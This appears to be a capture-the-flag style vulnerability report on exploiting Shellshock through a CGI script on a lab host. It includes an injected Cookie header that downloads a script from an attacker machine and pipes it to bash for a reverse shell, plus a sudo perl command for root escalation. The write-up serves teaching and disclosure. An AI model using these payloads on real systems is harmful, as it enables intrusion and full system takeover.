# Vulnerability Report on Shell Shock Vulnerability

# [Shell Shock](https://nvd.nist.gov/vuln/detail/CVE-2014-6271#match-7146748) exploit via CGI components ******************************at****************************** `http://10.10.10.56/cgi-bin/user.sh` ********************************to Remote Code Execute********************************

## Description and Impact

> http://10.10.10.56/cgi-bin/user.sh is a bash script perform time checker located inside cgi-bin folder, which expose to the outside world. Due to out-date of Bash, the script is allow to take advantage to perform tasks directly to Bash and lead to remote execution.
> 

## Step to Reproduce

1. Shellshock
    
    From BurpSuite, we want to capture a packet from proxy and move it to repeater. From repeater, we noticed that this user.sh file is running some kind of time checking which we already known that file stored in cgi-bin folder will communicate directly to Bash.
    
    ![Untitled](Vulnerability%20Report%20on%20Shell%20Shock%20Vulnerability%207d0e82428fdd4b57bf5df01dcf67adf0/Untitled.png)
    
    ```bash
    env x='() { :;}; echo vulnerable' bash -c "echo test"
    ```
    
    From the PoC, due to the misunderstanding of handling the character, which is the main cause of the vulnerable, attacker can directly force bash to run command without authentication right from web access while abusing http headers in shell script that expose to the WWW in cgi-bin folder.
    
    ![Untitled](Vulnerability%20Report%20on%20Shell%20Shock%20Vulnerability%207d0e82428fdd4b57bf5df01dcf67adf0/Untitled%201.png)
    
2. Reverse shell and netcat 
    
    We want to test for our theory, we can try some variant of the PoC like abusing Cookie header:
    
    ![Untitled](Vulnerability%20Report%20on%20Shell%20Shock%20Vulnerability%207d0e82428fdd4b57bf5df01dcf67adf0/Untitled%202.png)
    
    From that, we can sure that our theory is right and we already go for 50% of the road, we want to make a connection back from the machine to take the full control.
    
    ```bash
    Cookie: () { exp;}; echo; /usr/bin/curl 10.10.14.15/shell.sh | /bin/bash
    ```
    
    ![Untitled](Vulnerability%20Report%20on%20Shell%20Shock%20Vulnerability%207d0e82428fdd4b57bf5df01dcf67adf0/Untitled%203.png)
    
    Using [payloadallthething](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#bash-udp) to take the sample reverse shell, use python httpserver to quickly host a server and use netcat as a listener on port 4444 set above within the shell.sh, we can make a connection back from the machine as user **shelly.**
    
3. Privilege Escalation  - Post exploit
    
    From here, we can read user.txt flag which stored in /home folder. However, we want to take a full control over the machine, which is the root privilege.
    
    We may want to take a look at sudo with option list which contains users’ privileges or commands that the user can run.
    
    ![Untitled](Vulnerability%20Report%20on%20Shell%20Shock%20Vulnerability%207d0e82428fdd4b57bf5df01dcf67adf0/Untitled%204.png)
    
    > If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.
    > 
    
    ```bash
    sudo perl -e 'exec "/bin/sh";'
    ```
    
    And with the help of [gtfobins](https://gtfobins.github.io/gtfobins/perl/), we can successful escalate to the root privilege and read the root flag in /root folder.
    
    ![Untitled](Vulnerability%20Report%20on%20Shell%20Shock%20Vulnerability%207d0e82428fdd4b57bf5df01dcf67adf0/Untitled%205.png)
    

## Recommendations

Patch to the newest Bash

Remove cgi-bin if not necessary

## References

ShellShock report the new york time: [https://www.nytimes.com/2014/09/26/technology/security-experts-expect-shellshock-software-bug-to-be-significant.html](https://www.nytimes.com/2014/09/26/technology/security-experts-expect-shellshock-software-bug-to-be-significant.html)

Technical report: [https://resources.infosecinstitute.com/topic/bash-bug-cve-2014-6271-critical-vulnerability-scaring-internet/](https://resources.infosecinstitute.com/topic/bash-bug-cve-2014-6271-critical-vulnerability-scaring-internet/)

CGI: [https://en.wikipedia.org/wiki/Common_Gateway_Interface](https://en.wikipedia.org/wiki/Common_Gateway_Interface)

Bash patch right after the CVE reveal: https://github.com/gitGNU/gnu_bash/commit/b64a0e1d0b412cedda763a32d6e5cd6927333f02

PoC produce by RedHat: [https://access.redhat.com/articles/1200223](https://access.redhat.com/articles/1200223)